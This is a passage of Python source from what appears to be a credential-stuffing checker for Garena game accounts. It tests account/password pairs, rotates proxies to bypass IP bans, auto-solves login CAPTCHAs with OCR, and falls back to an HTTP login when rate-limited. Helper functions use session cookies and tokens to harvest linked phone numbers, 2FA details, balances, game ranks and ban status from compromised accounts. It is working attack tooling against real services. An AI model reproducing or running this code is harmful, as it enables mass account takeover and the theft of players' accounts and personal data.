            redir = _qp(f'{base_url}app/')
            payload = (f'client_id=10017&response_type=token'
                       f'&redirect_uri={redir}&format=json&id={int(time.time())}')
            r = sess.post('https://authgop.garena.com/oauth/token/grant',
                data=payload, timeout=8,
                headers={'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                         'cookie': f'sso_key={sso_key}'})
            if r.status_code != 200: return {}
            access_token = (r.json() or {}).get('access_token', '')
            if not access_token: return {}
            # Step 2: inspect_token → session_key cookie
            r = sess.post(f'{base_url}api/auth/inspect_token',
                json={'token': access_token}, timeout=8,
                headers={'accept': 'application/json', 'content-type': 'application/json'})
            if r.status_code != 200: return {}
            inspect = r.json() or {}
            set_cookie = r.headers.get('Set-Cookie', '') or ''
            tg_session = ''
            if 'session_key=' in set_cookie:
                tg_session = set_cookie.split('session_key=', 1)[1].split(';', 1)[0]
            if not tg_session: return {}
            tvs = inspect.get('two_step_verify_status') or {}
            out = {
                'shells': int(inspect.get('shell_balance', 0) or 0),
                'uac': inspect.get('uac', '') or '',
                'tg_username': inspect.get('username', '') or '',
                '_shop_source': base_url,
                'tg_display_mobile': tvs.get('display_mobile_no', '') or '',
                'tg_2fa_bind_time': int(tvs.get('bind_time', 0) or 0),
                'tg_is_verified': bool(inspect.get('is_garena_verified')),
            }
            hdr = {'accept': 'application/json, text/plain, */*',
                   'cookie': f'source=pc; session_key={tg_session}'}
            # Step 3a: RoV TH roles (app_id=100055)
            try:
                rr = sess.get(f'{base_url}api/shop/apps/roles?app_id=100055&region=IN.TH&language=th&source=pc',
                    timeout=8, headers=hdr)
                if rr.status_code == 200:
                    roles_list = (rr.json() or {}).get('100055') or []
                    if roles_list:
                        role = roles_list[0]
                        out['rov_role_name']      = role.get('role', '') or ''
                        out['rov_role_id']        = int(role.get('role_id', 0) or 0)
                        out['rov_server']         = role.get('server', '') or ''
                        out['rov_server_id']      = int(role.get('server_id', 0) or 0)
                        out['rov_packed_role_id'] = int(role.get('packed_role_id', 0) or 0)
                        out['rov_open_id']        = role.get('open_id', '') or ''
                        out['has_rov_role']       = bool(out['rov_role_id'])
            except Exception:
                pass
            # Step 3b: AoV VN roles (app_id=100054)
            try:
                rr = sess.get(f'{base_url}api/shop/apps/roles?app_id=100054&language=vi&source=pc',
                    timeout=8, headers=hdr)
                if rr.status_code == 200:
                    aov_list = (rr.json() or {}).get('100054') or []
                    if aov_list:
                        aov_role = aov_list[0]
                        out['aov_tg_name']   = aov_role.get('role', '') or ''
                        out['aov_server']    = aov_role.get('server', '') or ''
                        out['aov_server_id'] = int(aov_role.get('server_id', 0) or 0)
                        out['aov_open_id']   = aov_role.get('open_id', '') or ''
            except Exception:
                pass
            return out
        except Exception:
            return {}

    for _base in ('https://termgame.com/', 'https://napthe.vn/'):
        _res = _try_shop_site(_base)
        if _res:
            return _res
    return {}


def _fetch_fc_prefill_via_sso(sso_key: str, proxy=None) -> str:
    """Fetch unmasked prefill_mobile using specific headers per user snippet."""
    if not HAS_REQUESTS or not sso_key:
        return ""
    try:
        grant_post_data = f'client_id=100155&response_type=token&redirect_uri=gop100155%3A%2F%2F&login_scenario=normal&format=json&id={round(time.time() * 1000)}'
        grant_headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GarenaMSDK/5.12.0 (iPhone15,3;ios - 18.6;vi-JP;JP',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Accept-Language': 'vi-VN,vi;q=0.9',
            'Origin': 'https://100155.connect.garena.com',
            'Referer': 'https://100155.connect.garena.com/universal/oauth?locale=vi_JP&platform=1&response_type=token&login_scenario=normal&client_id=100155&display=embedded&redirect_uri=gop100155%3A%2F%2F',
            'Cookie': f'sso_key={sso_key}'
        }
        grant_url = 'https://100155.connect.garena.com/oauth/token/grant'
        grant_response = _requests.post(grant_url, data=grant_post_data, headers=grant_headers, timeout=7, verify=False, proxies=_get_http_proxies(proxy))
        access_token = grant_response.json().get('access_token', '')
        if not access_token:
            return ""

        headers2 = {
            'User-Agent': 'GarenaMSDK/5.12.1(SM-S908N ;Android 9;vi;vn;)',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'If-Modified-Since': 'Thu, 05 Mar 2026 02:22:02 GMT',
        }
        response = _requests.get(
            f'https://100155.connect.garena.com/api/v1/game/local-requirement/user-info?app_id=100155&region=VN&access_token={access_token}',
            headers=headers2,
            timeout=7,
            verify=False,
            proxies=_get_http_proxies(proxy)
        )
        return response.json().get('data', {}).get('prefill_mobile', '')
    except Exception:
        pass
    return ""

def _df_sign_url(path: str, params: dict = None) -> str:
    """Build a signed URL for Delta Force sg-act API calls.
    Adds u (uuid), a (10005), ts (timestamp), s (MD5 sig) query params.
    """
    u = str(uuid.uuid4())
    ts = str(int(time.time()))
    qs = f"u={u}&a=10005&ts={ts}"
    if params:
        extra = "&".join(f"{k}={v}" for k, v in params.items())
        qs = extra + "&" + qs
    full = f"{path}?{qs}"
    sig = hashlib.md5(f"/{full}&appkey=intel#!2022$act".encode()).hexdigest()
    return f"{full}&s={sig}"

def _fetch_delta_force_info(sso_key: str, proxy=None) -> dict:
    """Fetch Delta Force (playerinfinite) account info via Garena SSO key.

    Flow:
      1. authgop.garena.com/oauth/token/grant  client_id=100151 → Garena access_token + open_id
      2. intlsdk-new.iegg.garena.com/v2/auth/login  → INTL token + openid
      3. sg-community.playerinfinite.com  LoginByINTL → ticket + uid
      4. sg-act.playerinfinite.com  DfTools/GetMyData → player data
    """
    if not HAS_REQUESTS or not sso_key:
        return {}
    out = {}
    proxies = _get_http_proxies(proxy)
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'
    try:
        # ── Step 1: Garena OAuth grant → access_token + open_id ──
        grant_data = (
            f'client_id={DF_GARENA_CLIENT_ID}&response_type=token'
            f'&redirect_uri=https%3A%2F%2Fcommon-web.intlgame.com%2Fjssdk%2Fgarenalogincallback.html'
            f'&format=json&id={int(time.time())}'
        )
        r = _requests.post(
            'https://authgop.garena.com/oauth/token/grant',
            data=grant_data, timeout=8, verify=False,
            headers={
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'User-Agent': ua,
                'Cookie': f'sso_key={sso_key}',
            },
            proxies=proxies,
        )
        if r.status_code != 200:
            return out
        garena = r.json() or {}
        garena_token = garena.get('access_token', '')
        garena_openid = garena.get('open_id', '') or str(garena.get('uid', ''))
        if not garena_token:
            return out
        out['df_garena_token'] = True

        # ── Step 2: INTL SDK auth/login → INTL token + openid ──
        ts_ms = str(int(time.time() * 1000))
        intl_body = {
            "device_info": {
                "guest_id": str(uuid.uuid4()),
                "lang_type": "en",
                "app_version": "0.0",
                "screen_height": 864, "screen_width": 1536,
                "device_brand": "Google Inc.",
                "device_model": ua,
                "network_type": "4g",
                "ram_total": 8, "rom_total": 8,
                "cpu_name": "Win32",
                "android_imei": "", "ios_idfa": "",
                "page": "https%3A%2F%2Fwww.playdeltaforce.com%2Fevents%2Fhq%2F",
                "page_with_search": "https%3A%2F%2Fwww.playdeltaforce.com%2Fevents%2Fhq%2F",
                "ts": int(ts_ms),
            },
            "channel_dis": "00000000",
            "channel_info": {
                "thirdType": "garena",
                "token": garena_token,
                "openId": garena_openid,
            },
        }
        intl_params = (
            f'channelid=10&conn=0&gameid=30150&os=5'
            f'&sdk_version=1.22.1&seq=&source=32&ts={ts_ms}'
        )
        intl_r = _requests.post(
            f'https://intlsdk-new.iegg.garena.com/v2/auth/login?{intl_params}',
            json=intl_body, timeout=10, verify=False,
            headers={'Content-Type': 'application/json', 'User-Agent': ua},
            proxies=proxies,
        )
        intl_data = intl_r.json() if intl_r.status_code == 200 else {}
        intl_token = intl_data.get('token', '')
        intl_openid = intl_data.get('openid', '')
        intl_expires = intl_data.get('token_expire_time', '') or intl_data.get('expire_time', '')
        if not intl_token:
            out['df_intl_error'] = intl_data.get('msg', 'no token')
            return out
        out['df_intl_ok'] = True

        # ── Step 3: CMS LoginByINTL → ticket + uid ──
        cms_path = _df_sign_url('api/gpts.auth_svr.AuthSvr/LoginByINTL')
        cms_body = {
            "mappid": 10109,
            "clienttype": 903,
            "login_info": {
                "channel_id": 10,
                "token": intl_token,
                "open_id": intl_openid,
                "channelid": 10,
                "expires": str(intl_expires),
                "game_id": "30150",
                "channel_info": "{}",
            },
        }
        cms_r = _requests.post(
            f'https://sg-community.playerinfinite.com/{cms_path}',
            json=cms_body, timeout=10, verify=False,
            headers={'Content-Type': 'application/json', 'User-Agent': ua},
            proxies=proxies,
        )
        cms_data = cms_r.json() if cms_r.status_code == 200 else {}
        ticket = ''
        uid = ''
        if isinstance(cms_data.get('data'), dict):
            ticket = cms_data['data'].get('ticket', '')
            uid = str(cms_data['data'].get('uid', ''))
        if not ticket:
            out['df_cms_error'] = cms_data.get('msg', 'no ticket')
            return out
        out['df_ticket'] = True
        out['df_uid'] = uid

        # ── Step 4: GetMyData → player stats ──
        api_path = _df_sign_url('api/proxy/logicial/DfTools/GetMyData')
        api_body = {"needLogin": True, "seasonno": [], "report_type": 1}
        api_r = _requests.post(
            f'https://sg-act.playerinfinite.com/{api_path}',
            json=api_body, timeout=10, verify=False,
            headers={
                'Content-Type': 'application/json',
                'User-Agent': ua,
                'X-Ticket': ticket,
                'X-uid': uid,
                'x-gameid': '29158',
                'x-source': 'pc_web',
                'x-language': 'vi',
                'Origin': 'https://www.playdeltaforce.com',
                'Referer': 'https://www.playdeltaforce.com/',
            },
            proxies=proxies,
        )
        api_data = api_r.json() if api_r.status_code == 200 else {}
        if api_data.get('code') == 0 and isinstance(api_data.get('data'), dict):
            d = api_data['data']
            out['df_has_data'] = True
            out['df_nickname'] = d.get('nickname', '') or d.get('name', '')
            out['df_level'] = d.get('level', 0) or d.get('lv', 0)
            out['df_uid_game'] = d.get('uid', '') or uid
            out['df_avatar'] = d.get('avatar', '')
            out['df_raw'] = d
            # Try extract season stats
            seasons = d.get('season_data') or d.get('seasons') or []
            if isinstance(seasons, list) and seasons:
                latest = seasons[0] if isinstance(seasons[0], dict) else {}
                out['df_rank'] = latest.get('rank_name', '') or latest.get('rank', '')
                out['df_season'] = latest.get('season_name', '') or latest.get('seasonno', '')
                out['df_matches'] = latest.get('total_match', 0) or latest.get('matches', 0)
                out['df_wins'] = latest.get('win_match', 0) or latest.get('wins', 0)
                out['df_kd'] = latest.get('kd', '') or latest.get('kd_ratio', '')
        else:
            out['df_api_error'] = api_data.get('msg', 'no data')
            out['df_api_code'] = api_data.get('code', -1)

        # ── Step 4b: Try GetDailyReport too ──
        try:
            daily_path = _df_sign_url('api/proxy/logicial/DfTools/GetDailyReport')
            daily_body = {"needLogin": True, "report_type": 1}
            daily_r = _requests.post(
                f'https://sg-act.playerinfinite.com/{daily_path}',
                json=daily_body, timeout=8, verify=False,
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': ua,
                    'X-Ticket': ticket,
                    'X-uid': uid,
                    'x-gameid': '29158',
                    'x-source': 'pc_web',
                    'x-language': 'vi',
                    'Origin': 'https://www.playdeltaforce.com',
                    'Referer': 'https://www.playdeltaforce.com/',
                },
                proxies=proxies,
            )
            daily_data = daily_r.json() if daily_r.status_code == 200 else {}
            if daily_data.get('code') == 0 and isinstance(daily_data.get('data'), dict):
                out['df_daily'] = daily_data['data']
        except Exception:
            pass

        return out
    except Exception:
        return out


def _fetch_fc_mobile_vn_user_info(access_token: str, region: str = "VN", proxy=None) -> dict:
    if not HAS_REQUESTS or not access_token:
        return {}
    try:
        params = {"app_id": str(FC_MOBILE_VN_APP_ID), "region": region or "VN", "access_token": access_token}
        resp = _requests.get(
            "https://connect.garena.com/api/v1/game/local-requirement/user-info",
            params=params,
            verify=False,
            timeout=5,
            proxies=_get_http_proxies(proxy),
        )
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, dict):
                return data
    except Exception:
        pass
    return {}

def _fetch_aov_user_info(access_token: str, region: str = "VN", proxy=None) -> dict:
    if not HAS_REQUESTS or not access_token:
        return {}
    try:
        params = {"app_id": str(LIEN_QUAN_APP_ID), "region": region or "VN", "access_token": access_token}
        resp = _requests.get(
            "https://connect.garena.com/api/v1/game/local-requirement/user-info",
            params=params,
            verify=False,
            timeout=5,
            proxies=_get_http_proxies(proxy),
        )
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, dict):
                return data
    except Exception:
        pass
    return {}

def _fetch_fcmobile_web_me(session_cookie_value: str, host: str = "liendoan.fcmobile.garena.vn", cookie_name: str = "ff_session", proxy=None) -> dict:
    if not HAS_REQUESTS or not session_cookie_value:
        return {}
    try:
        url = f"https://{host}/api/app/me"
        headers = {
            "Accept": "application/json, text/plain, */*",
            "X-Requested-With": "com.garena.game.fcmobilevn",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; SM-A528B Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36; GarenaMSDK/5.12.1",
            "Referer": f"https://{host}/",
        }
        cookies = {cookie_name: session_cookie_value}
        resp = _requests.get(
            url,
            headers=headers,
            cookies=cookies,
            verify=False,
            timeout=5,
            proxies=_get_http_proxies(proxy),
        )
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, dict):
                return data
    except Exception:
        pass
    return {}

def _fetch_fcmobile_web_me_session(sess, host: str, path: str = "/api/app/me", proxy=None) -> dict:
    if not HAS_REQUESTS or not sess or not host:
        return {}
    try:
        path = path if str(path or "").startswith("/") else ("/" + str(path or ""))
        url = f"https://{host}{path}"
        headers = {
            "Accept": "application/json, text/plain, */*",
            "X-Requested-With": "com.garena.game.fcmobilevn",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; SM-A528B Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36; GarenaMSDK/5.12.1",
            "Referer": f"https://{host}/",
        }
        if proxy:
            sess.proxies = _get_http_proxies(proxy) or {}
        resp = sess.get(url, headers=headers, verify=False, timeout=5, allow_redirects=True)
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, dict):
                return data
        return {
            "_status_code": getattr(resp, "status_code", None),
            "_path": path,
            "_text": (getattr(resp, "text", "") or "")[:300],
        }
    except Exception as exc:
        return {"_error": str(exc)}

def _fetch_fcmobile_ss_fcm(host: str, access_token: str, proxy=None) -> dict:
    if not HAS_REQUESTS or not host or not access_token:
        return {}
    try:
        sess = _requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy) or {}
        base = f"https://{host}"
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "X-Requested-With": "com.garena.game.fcmobilevn",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; SM-A528B Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36; GarenaMSDK/5.12.1",
            "Referer": f"{base}/",
        }
        resp = sess.get(
            base + "/connect/garena/callback",
            params={"access_token": access_token, "source_type": "ingame"},
            headers=headers,
            verify=False,
            timeout=5,
            allow_redirects=True,
        )
        out = {
            "status_code": getattr(resp, "status_code", None),
            "final_url": getattr(resp, "url", None),
            "history": [getattr(r, "status_code", None) for r in getattr(resp, "history", [])],
            "ss_fcm": sess.cookies.get("ss_fcm") or "",
            "ff_session": sess.cookies.get("ff_session") or "",
        }
        return out
    except Exception:
        return {}

def _fetch_fcmobile_me_from_access_token(access_token: str, proxy=None) -> dict:
    if not HAS_REQUESTS or not access_token:
        return {}
    hosts = ["liendoan.fcmobile.garena.vn", "hiepphu3.fcmobile.garena.vn"]
    paths = ["/api/app/me", "/api/me", "/api/user/me", "/api/v1/app/me"]
    for h in hosts:
        sess = _requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy) or {}
        base = f"https://{h}"
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "X-Requested-With": "com.garena.game.fcmobilevn",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; SM-A528B Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36; GarenaMSDK/5.12.1",
            "Referer": f"{base}/",
        }
        try:
            if h == "liendoan.fcmobile.garena.vn":
                resp = sess.get(
                    base + "/connect/garena/callback",
                    params={"access_token": access_token, "source_type": "ingame"},
                    headers=headers,
                    verify=False,
                    timeout=5,
                    allow_redirects=True,
                )
            else:
                resp = sess.get(
                    base + "/",
                    params={"garena_token": access_token},
                    headers=headers,
                    verify=False,
                    timeout=5,
                    allow_redirects=True,
                )
            cb = {
                "status_code": getattr(resp, "status_code", None),
                "final_url": getattr(resp, "url", None),
                "history": [getattr(r, "status_code", None) for r in getattr(resp, "history", [])],
                "ss_fcm": sess.cookies.get("ss_fcm") or "",
                "ff_session": sess.cookies.get("ff_session") or "",
            }
        except Exception as exc:
            cb = {"_error": str(exc), "ss_fcm": "", "ff_session": ""}
        ss = (cb or {}).get("ss_fcm", "") or ""
        ff = (cb or {}).get("ff_session", "") or ""
        if not ss and not ff:
            continue
        last_me = {}
        for p in paths:
            me = _fetch_fcmobile_web_me_session(sess, h, path=p, proxy=proxy)
            last_me = me
            u = me.get("user", {}) if isinstance(me, dict) else {}
            if isinstance(u, dict) and u:
                out = {"host": h, "ss_fcm": ss, "ff_session": ff, "user": u, "path": p}
                out["ovr"] = u.get("ovr")
                out["uid"] = u.get("uid")
                out["name"] = u.get("name")
                out["rankTCN"] = u.get("rankTCN")
                out["rankDDC"] = u.get("rankDDC")
                out["rankDGL"] = u.get("rankDGL")
                out["point"] = u.get("Point")
                return out
        continue
    return {}

def _fetch_fcmobile_ff_session(host: str, garena_token: str = "", access_token: str = "", sso_key: str = "", proxy=None) -> str:
    if not HAS_REQUESTS or not host:
        return ""
    garena_token = (garena_token or "").strip()
    access_token = (access_token or "").strip()
    sso_key = (sso_key or "").strip()
    if not garena_token and not access_token and not sso_key:
        return ""
    try:
        sess = _requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy) or {}
        base = f"https://{host}"
        candidates = []
        if garena_token:
            candidates.extend([
                ("/", {"garena_token": garena_token}),
                ("/login", {"garena_token": garena_token}),
                ("/auth", {"garena_token": garena_token}),
                ("/auth/login", {"garena_token": garena_token}),
                ("/login/callback", {"ingame": "true", "garena_token": garena_token}),
                ("/auth/login/callback", {"ingame": "true", "garena_token": garena_token}),
                ("/login/callback", {"token": garena_token}),
                ("/auth/login/callback", {"token": garena_token}),
                ("/login/callback", {"session_key": garena_token}),
                ("/auth/login/callback", {"session_key": garena_token}),
            ])
        if access_token:
            candidates.extend([
                ("/", {"access_token": access_token}),
                ("/login/callback", {"ingame": "true", "access_token": access_token}),
                ("/auth/login/callback", {"ingame": "true", "access_token": access_token}),
                ("/login", {"access_token": access_token}),
                ("/login/callback", {"token": access_token}),
                ("/auth/login/callback", {"token": access_token}),
            ])
        if sso_key:
            candidates.extend([
                ("/", {"sso_key": sso_key}),
                ("/login/callback", {"ingame": "true", "sso_key": sso_key}),
                ("/auth/login/callback", {"ingame": "true", "sso_key": sso_key}),
                ("/login/callback", {"sso_key": sso_key}),
                ("/auth/login/callback", {"sso_key": sso_key}),
            ])
        headers = {
            "Accept": "*/*",
            "X-Requested-With": "com.garena.game.fcmobilevn",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; SM-A528B Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36; GarenaMSDK/5.12.1",
            "Referer": f"{base}/",
        }
        for path, params in candidates:
            try:
                sess.get(base + path, params=params, headers=headers, verify=False, timeout=5, allow_redirects=True)
                ff = sess.cookies.get("ff_session")
                if ff:
                    return ff
            except Exception:
                continue
    except Exception:
        pass
    return ""

def _fetch_kientuong_player(sock, session_key: bytes, proxy=None) -> dict:
    """kientuong.lienquan.garena.vn: level, registerTime, banInfo."""
    if not HAS_REQUESTS:
        return {}
    try:
        body = (
            _pf_varint(1, LIEN_QUAN_APP_ID) +
            _pf_str(2, "https://kientuong.lienquan.garena.vn/auth/login/callback") +
            _pf_varint(3, 1) +
            _pf_str(4, "") +
            _pf_varint(5, 0) +
            _pf_varint(6, CLIENT_PLATFORM_ANDROID)
        )
        hdr, resp = _send_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        redirect = fields[2].decode('utf-8') if 2 in fields else ''
        if not redirect:
            return {}
        sess = _requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy)
        sess.get(redirect, allow_redirects=False, verify=False, timeout=5)
        if not sess.cookies:
            return {}
        resp2 = sess.get("https://kientuong.lienquan.garena.vn/api/player/get",
                         verify=False, timeout=5)
        if resp2.status_code == 200:
            player = resp2.json().get('player', {})
            import datetime
            reg_ts = player.get('registerTime')
            reg_str = datetime.datetime.fromtimestamp(reg_ts).strftime('%H:%M:%S %d-%m-%Y') if reg_ts else ''
            # Lấy rank từ kientuong (fallback cho weeklyreport)
            rank_str = ''
            rank_stars_kt = 0
            for rf in ('rankName', 'rank_name', 'rank', 'tier', 'tierName'):
                v = player.get(rf)
                if v:
                    if isinstance(v, dict):
                        rank_str = (v.get('name') or v.get('rankName') or v.get('tierName') or '').strip()
                        rank_stars_kt = int(v.get('stars', 0) or v.get('star', 0) or v.get('level', 0) or 0)
                    elif isinstance(v, str) and v.strip():
                        rank_str = v.strip()
                    if rank_str:
                        break
            # Gộp nhiều shape ban payload để tránh miss khi API đổi field.
            ban_payload = [
                player.get('banInfo'),
                player.get('punishInfo'),
                player.get('punishment'),
                {
                    'isBan': player.get('isBan'),
                    'isBanned': player.get('isBanned'),
                    'banned': player.get('banned'),
                    'ban': player.get('ban'),
                    'banStatus': player.get('banStatus'),
                    'status': player.get('status'),
                    'state': player.get('state'),
                    'endTime': player.get('endTime'),
                    'banEndTime': player.get('banEndTime'),
                    'unbanTime': player.get('unbanTime'),
                    'expireAt': player.get('expireAt'),
                    'expiredAt': player.get('expiredAt'),
                    'banTime': player.get('banTime'),
                }
            ]
            return {
                'level': player.get('level', 0),
                'register_time': reg_str,
                'banned': 'YES' if _is_banned_info(ban_payload) else 'NO',
                'rank': rank_str,
                'rank_stars': rank_stars_kt,
                '_raw_player': player,
            }
    except Exception:
        pass
    return {}

def _translate_aov_rank(rank_str: str) -> str:
    if not rank_str: return rank_str
    s = rank_str.lower()
    if 'บรอนซ์' in s or 'bronze' in s or '青銅' in s: return 'Đồng'
    if 'ซิลเวอร์' in s or 'silver' in s or '白銀' in s: return 'Bạc'
    if 'โกลด์' in s or 'gold' in s or '黃金' in s: return 'Vàng'
    if 'แพลทินัม' in s or 'platinum' in s or '鉑金' in s: return 'Bạch Kim'
    if 'ไดมอนด์' in s or 'diamond' in s or '鑽石' in s: return 'Kim Cương'
    if 'คอมมานเดอร์' in s or 'commander' in s or '星耀' in s: return 'Tinh Anh'
    if 'กลอเรียสรูเลอร์' in s or 'glorious ruler' in s: return 'Thách Đấu'
    if 'ซูพรีมคอนเควอร์เรอร์' in s or 'supreme conqueror' in s or '璀璨傳說' in s: return 'Chiến Tướng'
    if 'คอนเควอร์เรอร์' in s or 'conqueror' in s or 'master' in s or '戰場傳說' in s: return 'Cao Thủ'
    return rank_str

# ── Core check ────────────────────────────────────────────────────────────────
_PROXY_ERRORS = (
    'Proxy closed connection',
    'Proxy CONNECT failed',
    'No connection could be made',
    'Connection dropped',
    'target machine actively refused',
    'A connection attempt failed',
    'connected party did not properly respond',
    'getaddrinfo failed',
    'Connection refused',
)

_TIMEOUT_ERRORS = ('timed out', 'TimeoutError')


def _is_proxy_error(detail: str) -> bool:
    if not detail:
        return False
    return any(err in detail for err in _PROXY_ERRORS)


def _is_timeout_error(detail: str) -> bool:
    if not detail:
        return False
    return any(err in detail for err in _TIMEOUT_ERRORS)


def _is_port_exhaustion(detail: str) -> bool:
    if not detail:
        return False
    return '10048' in detail or 'Only one usage' in detail


def _validate_hit(r: dict) -> bool:
    """Check if HIT result has essential info fields populated."""
    if not r.get('uid'):
        return False
    return bool(r.get('username') or r.get('region') or r.get('nickname'))


def check_login(account: str, password: str, timeout: int = 7, fetch_info: bool = False, proxy=None, debug: bool = False) -> dict:
    result = None
    proxy_fails = 0
    no_proxy_mode = (proxy is None and not _proxy_list)
    max_retries = 2 if no_proxy_mode else 4

    for _retry in range(max_retries):
        if proxy is None and _proxy_list:
            proxy = _next_proxy()

        result = _check_login_once(account, password, timeout, fetch_info, proxy, debug=debug)
        detail = result.get('detail', '')
        status = result.get('status', '')

        if status == 'HIT':
            return result
        if 'result=3' in detail:
            return result
        if 'result=101' in detail:
            return result

        if _is_port_exhaustion(detail):
            time.sleep(0.3)
            proxy = _next_proxy() if _proxy_list else None
            continue

        if status == 'TIMEOUT' and no_proxy_mode:
            result['status'] = 'PORT_BLOCKED'
            result['detail'] = 'Port 19000 bi chan (ISP/Garena ban IP). Dung proxy de bypass.'
            return result

        if status in ('ERROR', 'TIMEOUT') or _is_proxy_error(detail):
            proxy_fails += 1
            proxy = _next_proxy() if _proxy_list else None
            time.sleep(0.3)
            continue

        if detail == 'Empty LoginReply data':
            proxy = _next_proxy() if _proxy_list else None
            continue

        return result

    if result:
        if no_proxy_mode and result.get('status') == 'TIMEOUT':
            result['status'] = 'PORT_BLOCKED'
            result['detail'] = 'Port 19000 bi chan (ISP/Garena ban IP). Dung proxy de bypass.'
        elif proxy_fails >= 3:
            result['status'] = 'PROXY_FAIL'
            result['detail'] = f'proxy_error x{proxy_fails}'
    return result


def _check_login_once(account: str, password: str, timeout: int = 7, fetch_info: bool = False, proxy=None, debug: bool = False) -> dict:
    global _HOST_IP
    # Acquire connection slot — giai phong tu dong khi ham ket thuc
    _conn_sem.acquire()
    sock = None
    dbg = {}
    try:
        host_ip = _resolve_host_ip()
        if proxy:
            sock = _connect_via_proxy(proxy, host_ip, PORT, timeout)
        else:
            # Retry toi da 3 lan neu bi WinError 10048 (Windows het ephemeral port)
            for _attempt in range(3):
                try:
                    sock = _make_fast_socket(timeout)
                    sock.connect((host_ip, PORT))
                    break  # ket noi thanh cong
                except OSError as _e:
                    try: sock.close()
                    except: pass
                    sock = None
                    if getattr(_e, 'winerror', None) == 10048 and _attempt < 2:
                        time.sleep(0.5 * (_attempt + 1))
                        continue
                    raise

        # Step 1: CMD_LOGIN_PREPARE (256)
        rand_key  = os.urandom(16)
        prep_body = _build_login_prepare(account, rand_key)
        sock.sendall(_build_frame(CMD_LOGIN_PREPARE, prep_body))

        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN_PREPARE, max_tries=5)
        result_code = hdr.get(5, 0)
        if debug:
            dbg.update({
                "prepare_result": result_code,
                "prepare_body_len": len(body) if body else 0,
            })
        if result_code != 0:
            # Ánh xạ mã lỗi từ GxxData.Constant.Result (login/d.java AnonymousClass8)
            # 1=ERROR_AUTH(sai pass), 2=ACCOUNT_NOT_EXIST, 3=ERROR_CAPTCHA(rate-limit),
            # 4=ERROR_AUTH_USER_BAN, 5=ERROR_AUTH_SECURITY_BAN
            
            if result_code == 3:
                # Thu giai CAPTCHA tu dong bang ddddocr truoc khi fallback HTTP
                # Cho phep thu giai toi da 3 lan voi anh moi moi lan
                for attempt_solve in range(3):
                    ckey, ctext = _solve_garena_captcha(proxy_dict=_get_http_proxies(proxy))
                    if ckey and ctext:
                        # Garena CAPTCHA thuong 5-6 ky tu. Neu ddddocr tra ve qua ngan (<5), bo qua lay anh khac.
                        if len(ctext) < 5:
                            if debug:
                                dbg[f"tcp_captcha_attempt_{attempt_solve}_short"] = ctext
                            continue
                            
                        if debug: dbg[f"tcp_captcha_solve_attempt_{attempt_solve}"] = ctext
                        
                        # Gui lai LOGIN_PREPARE voi captcha
                        prep_body = _build_login_prepare(account, rand_key, captcha_key=ckey, captcha=ctext)
                        sock.sendall(_build_frame(CMD_LOGIN_PREPARE, prep_body))
                        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN_PREPARE, max_tries=5)
                        result_code = hdr.get(5, 0)
                        
                        if debug: dbg[f"tcp_captcha_solve_result_{attempt_solve}"] = result_code
                        
                        if result_code == 0:
                            break # Thanh cong!
                        elif result_code != 3:
                            break # Loi khac (sai pass, ban, v.v.) -> thoat de xu ly ben duoi
                    else:
                        break # Khong lay duoc anh hoac loi OCR -> thoat
                
                # Neu thanh cong (result=0), tiep tuc luong binh thuong vao Step 2
                # Neu van failure (!=0), se thuc hien fallback HTTP ben duoi

            if result_code != 0:
                http_r = {}
                if result_code == 3 and HAS_REQUESTS:
                    # CAPTCHA/rate-limit → thử fallback qua HTTP API
                    if debug:
                        dbg["prepare_captcha_fallback"] = True
                    http_r = _http_login_garena(account, password, proxy=proxy, timeout=timeout)
                    if 'access_token' in http_r:
                        out = {
                            "account": account, "password": password,
                            "status": "HIT", "_login_method": "http",
                            "aov_token": http_r["access_token"],
                        }
                        if debug:
                            dbg["http_fallback_ok"] = True
                            out["debug"] = dbg
                        return out
                    err_code = http_r.get('error_code', '')
                    if err_code in ('invalid_grant', 'access_denied'):
                        out = {"account": account, "password": password,
